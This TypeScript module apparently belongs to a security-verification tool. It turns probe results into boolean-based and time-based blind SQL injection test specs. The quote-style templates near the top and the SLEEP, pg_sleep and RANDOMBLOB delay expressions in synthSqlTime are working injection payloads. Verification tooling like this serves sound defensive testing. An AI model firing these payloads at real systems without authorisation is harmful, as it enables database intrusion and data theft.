/** sql_boolean_diff / sql_time_diff spec synthesis from sqli probe signals. */
import { baseFields, stepOf } from './benchmark-specs-common.ts'
import type { SynthesizedSpec } from './benchmark-specs-common.ts'
import { probePathFor } from './benchmark-probes.ts'
import type { HypothesisOutcome, ProbeEnv } from './benchmark-probes.ts'

function booleanStyle(style: string): { quoteStyle: 'single' | 'double' | 'numeric'; valueTemplate?: string } {
  switch (style) {
    case 'numeric': return { quoteStyle: 'numeric' }
    case 'double_quote': return { quoteStyle: 'double' }
    case 'single_quote': return { quoteStyle: 'single' }
    case 'or_branch': return { quoteStyle: 'single', valueTemplate: "{{baseline}}' OR {{sql_expr}}-- -" }
    case 'single_paren': return { quoteStyle: 'single', valueTemplate: "{{baseline}}') AND {{sql_expr}}-- -" }
    case 'single_double_paren': return { quoteStyle: 'single', valueTemplate: "{{baseline}}')) AND {{sql_expr}}-- -" }
    case 'like_breakout': return { quoteStyle: 'single', valueTemplate: "{{baseline}}%' AND {{sql_expr}}-- -" }
    case 'order_by': return { quoteStyle: 'single', valueTemplate: '{{baseline}} ORDER BY (CASE WHEN ({{sql_expr}}) THEN 1 ELSE 2 END)-- -' }
    default: return { quoteStyle: 'single' }
  }
}

function injectionFields(o: HypothesisOutcome, env: ProbeEnv) {
  const param = o.hyp.param!
  const body: Record<string, unknown> = {}
  for (const p of o.hyp.endpoint.params) {
    if (p.name !== param.name && p.location === o.hyp.location && !p.isCsrf) body[p.name] = 'guardian'
  }
  const loc = o.hyp.location!
  return {
    targetOrigin: env.origin,
    method: o.hyp.method,
    pathAndQuery: probePathFor(o.hyp),
    ...(env.owner ? { persona: env.owner } : {}),
    ...(env.caps.sessionAndCsrf ? { session: env.session } : {}),
    ...(env.caps.sessionAndCsrf && o.hyp.endpoint.params.some(p => p.isCsrf) ? { csrfBind: true } : {}),
    ...(loc === 'json' || loc === 'form' ? { jsonBody: body } : {}),
    ...(loc === 'graphql_var' ? { jsonBody: { variables: body }, ...(o.ctx?.graphqlQuery ? { graphqlQuery: o.ctx.graphqlQuery } : {}) } : {}),
    ...(loc === 'xml' && o.ctx?.xmlTemplate ? { xmlTemplate: o.ctx.xmlTemplate } : {}),
    paramName: param.name,
    paramLocation: loc,
    baselineValue: o.ctx?.baseline ?? '1',
  }
}

/** A setup request that lets the broker jar learn session cookies and CSRF tokens before the rounds. */
function primingFields(env: ProbeEnv) {
  return env.caps.sessionAndCsrf
    ? { controlStep: stepOf(env, 'c0', 'setup', 'Load the entry page to bind session and CSRF cookies', { method: 'GET', pathAndQuery: '/' }, env.owner) }
    : {}
}


/**
 * Cut 3c/3d prep: every emitted SQL spec also carries the `boolean_or_timing` recipe envelope, so
 * the retest/replay path can run the typed recipe instead of re-interpreting the spec VM. The
 * envelope is *attribution + retest* only: the spec's own declarative fields above stay untouched,
 * so initial verification semantics (and xben's status-differential targets) are unchanged.
 */
function cut3RecipeEnvelope(
  o: HypothesisOutcome,
  env: ProbeEnv,
  mode: 'boolean' | 'status' | 'timing',
  selection: { baselineValue: string; quoteStyle?: string; valueTemplate?: string; payload?: string; contradiction?: string },
): { recipeId: 'boolean_or_timing'; args: Record<string, unknown> } | undefined {
  const fields = injectionFields(o, env)
  const location = fields.paramLocation
  if (location !== 'query' && location !== 'json' && location !== 'form') return undefined
  const armFor = (value: string): { pathAndQuery: string; jsonBody?: Record<string, unknown> } => {
    if (location === 'query') {
      try {
        const url = new URL(fields.pathAndQuery, 'http://guardian.invalid')
        url.searchParams.set(fields.paramName, value)
        return { pathAndQuery: `${url.pathname}${url.search}` }
      } catch {
        return { pathAndQuery: fields.pathAndQuery }
      }
    }
    return {
      pathAndQuery: fields.pathAndQuery,
      jsonBody: { ...((fields.jsonBody as Record<string, unknown> | undefined) ?? {}), [fields.paramName]: value },
    }
  }
  const control = armFor(selection.baselineValue)
  const tautologyValue = selection.valueTemplate
    ? selection.valueTemplate.replaceAll('{{baseline}}', selection.baselineValue).replaceAll('{{sql_expr}}', '1=1')
    : selection.payload
      ? selection.payload
      : `${selection.baselineValue}' AND 1=1-- -`
  const contradictionValue = selection.contradiction
    ?? `${selection.baselineValue}' AND 1=2-- -`
  const tautology = armFor(tautologyValue)
  const contradiction = armFor(contradictionValue)
  // A path/header/xml parameter cannot be moved by a query or JSON arm builder.
  if (!tautology.pathAndQuery && !tautology.jsonBody) return undefined
  const actor = { handle: env.owner ?? 'anonymous' }
  const baseArgs = {
    origin: env.origin,
    method: fields.method,
    pathAndQuery: fields.pathAndQuery,
    vulnClass: mode === 'status' ? 'sqli_status' : 'sqli',
    mode,
    actor,
    param: fields.paramName,
    ...(selection.baselineValue ? { baselineValue: selection.baselineValue } : {}),
    ...(selection.quoteStyle ? { quoteStyle: selection.quoteStyle } : {}),
    ...(selection.valueTemplate ? { valueTemplate: selection.valueTemplate } : {}),
  }
  const args = mode === 'timing'
    ? {
        ...baseArgs,
        controlPathAndQuery: control.pathAndQuery,
        probePathAndQuery: tautology.pathAndQuery,
        ...(control.jsonBody ? { controlJsonBody: control.jsonBody } : {}),
        ...(tautology.jsonBody ? { probeJsonBody: tautology.jsonBody } : {}),
      }
    : mode === 'status'
      ? {
          ...baseArgs,
          receiptClass: 'sqli_status',
          rounds: 2,
          controlPathAndQuery: control.pathAndQuery,
          probePathAndQuery: tautology.pathAndQuery,
          contradictionPathAndQuery: contradiction.pathAndQuery,
          ...(control.jsonBody ? { controlJsonBody: control.jsonBody } : {}),
          ...(tautology.jsonBody ? { probeJsonBody: tautology.jsonBody } : {}),
          ...(contradiction.jsonBody ? { contradictionJsonBody: contradiction.jsonBody } : {}),
        }
      : {
          ...baseArgs,
          rounds: 2,
          controlPathAndQuery: control.pathAndQuery,
          probePathAndQuery: tautology.pathAndQuery,
          ...(control.jsonBody ? { controlJsonBody: control.jsonBody } : {}),
          ...(tautology.jsonBody ? { probeJsonBody: tautology.jsonBody } : {}),
        }
  return { recipeId: 'boolean_or_timing', args }
}

const jqBoolean = '{ controlPassed: (.sqlDiff.controlPassed == true), confirmed: (.sqlDiff.passed == true), observed: ("passed=" + (.sqlDiff.passed | tostring)), expected: "boolean differential holds" }'
const jqTime = '{ controlPassed: (.sqlTimeDiff.controlPassed == true), confirmed: (.sqlTimeDiff.passed == true), observed: ("deltaMs=" + (.sqlTimeDiff.deltaMedianMs | tostring)), expected: "time differential holds" }'

const fallbackStyles = ['single_quote', 'numeric', 'double_quote', 'or_branch']

export function synthSqlBoolean(o: HypothesisOutcome, env: ProbeEnv): SynthesizedSpec[] {
  if (!o.hyp.param || !o.hyp.location) return []
  const hit = o.anomalies.find(a => a.type === 'boolean_differential')
  if (hit) {
    const s = booleanStyle(String(hit.style ?? 'single_quote'))
    const envelope = cut3RecipeEnvelope(o, env, 'boolean', {
      baselineValue: String(hit.baselineValue ?? o.ctx?.baseline ?? '1'),
      quoteStyle: s.quoteStyle,
      ...(s.valueTemplate ? { valueTemplate: s.valueTemplate } : {}),
    })
    return [{
      kind: 'sql_boolean_diff',
      spec: {
        ...baseFields(env, 'Boolean-based SQL injection differential', 'CWE-89', 'injection-input', 'high', jqBoolean),
        kind: 'sql_boolean_diff',
        ...injectionFields(o, env),
        ...primingFields(env),
        quoteStyle: s.quoteStyle,
        ...(s.valueTemplate ? { valueTemplate: s.valueTemplate } : {}),
        ...(envelope ? { recipe: envelope } : {}),
      },
    }]
  }
  const hasErrorSignal = o.anomalies.some(a => a.type === 'db_error_fingerprint')
  if (!hasErrorSignal) return []
  if (o.hyp.location === 'graphql_var') return []
  // Error fingerprint proves the value reaches a SQL string literal. A tautology baseline plus the
  // verifier's randomized `k=k` / `k=k+1` triplet still yields a genuine boolean differential.
  const fingerprintEnvelope = cut3RecipeEnvelope(o, env, 'status', {
    baselineValue: String(o.ctx?.baseline ?? '1'),
    quoteStyle: 'single',
    valueTemplate: "x' OR {{sql_expr}}-- -",
    contradiction: "x' AND 1=2-- -",
  })
  const out: SynthesizedSpec[] = [{
    kind: 'sql_boolean_diff',
    spec: {
      ...baseFields(env, 'SQL injection via string-literal breakout (error fingerprint)', 'CWE-89', 'injection-input', 'high', jqBoolean),
      kind: 'sql_boolean_diff',
      ...injectionFields(o, env),
      ...primingFields(env),
      baselineValue: "x' OR 1=1-- -",
      quoteStyle: 'single',
      valueTemplate: "x' OR {{sql_expr}}-- -",
      ...(fingerprintEnvelope ? { recipe: fingerprintEnvelope } : {}),
    },
  }]
  // Additional observed-shape candidates, tried only when the generic breakout does not confirm.
  for (const style of fallbackStyles) {
    const s = booleanStyle(style)
    out.push({
      kind: 'sql_boolean_diff',
      spec: {
        ...baseFields(env, 'Boolean-based SQL injection differential', 'CWE-89', 'injection-input', 'high', jqBoolean),
        kind: 'sql_boolean_diff',
        ...injectionFields(o, env),
        ...primingFields(env),
        quoteStyle: s.quoteStyle,
        ...(s.valueTemplate ? { valueTemplate: s.valueTemplate } : {}),
      },
    })
  }
  return out
}

export function synthSqlTime(o: HypothesisOutcome, env: ProbeEnv): SynthesizedSpec[] {
  const hit = o.anomalies.find(a => a.type === 'sql_time_differential')
  if (!hit || !o.hyp.param || !o.hyp.location) return []
  // The typed time-diff schema only supports query/path/json/form injection.
  if (o.hyp.location === 'xml' || o.hyp.location === 'graphql_var' || o.hyp.location === 'header') return []
  const style = String(hit.style ?? 'single_quote')
  const dialectRaw = String(hit.dialect ?? '')
  if (!['postgres', 'mysql', 'sqlite', 'mssql'].includes(dialectRaw)) return []
  const dialect = dialectRaw as 'postgres' | 'mysql' | 'sqlite' | 'mssql'
  const delay = Math.max(1500, Math.min(3000, Number(hit.delayMs) || 1500))
  // OR-branch payloads keep the delay expression reachable when the caller's baseline value does not
  // match the stored row; the verifier substitutes fresh timing values into this template.
  const delayExpr: Partial<Record<string, string>> = {
    mysql: 'SLEEP({{delay_sec}})',
    postgres: '(SELECT 1 FROM pg_sleep({{delay_sec}})) IS NULL',
    sqlite: "1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({{delay_ms}} * 25000))))",
  }
  const orExpr = delayExpr[dialect]
  const valueTemplate = style === 'or_branch' && orExpr ? `{{baseline}}' OR ${orExpr}-- -` : undefined
  const timingEnvelope = cut3RecipeEnvelope(o, env, 'timing', {
    baselineValue: String(hit.baselineValue ?? o.ctx?.baseline ?? '1'),
    quoteStyle: booleanStyle(style).quoteStyle,
    ...(valueTemplate ? { valueTemplate } : {}),
  })
  return [{
    kind: 'sql_time_diff',
    spec: {
      ...baseFields(env, 'Time-based blind SQL injection differential', 'CWE-89', 'injection-input', 'high', jqTime),
      kind: 'sql_time_diff',
      ...injectionFields(o, env),
      ...primingFields(env),
      quoteStyle: booleanStyle(style).quoteStyle,
      dialect,
      delayMs: Math.round(delay),
      ...(valueTemplate ? { valueTemplate } : {}),
      ...(timingEnvelope ? { recipe: timingEnvelope } : {}),
    },
  }]
}
